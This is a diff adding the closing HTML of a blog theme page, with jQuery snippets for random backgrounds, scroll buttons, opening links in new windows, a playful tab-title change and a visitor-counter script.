+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+             title: "a.article-title, .article-more-link a", 
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 等主人回来啊~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
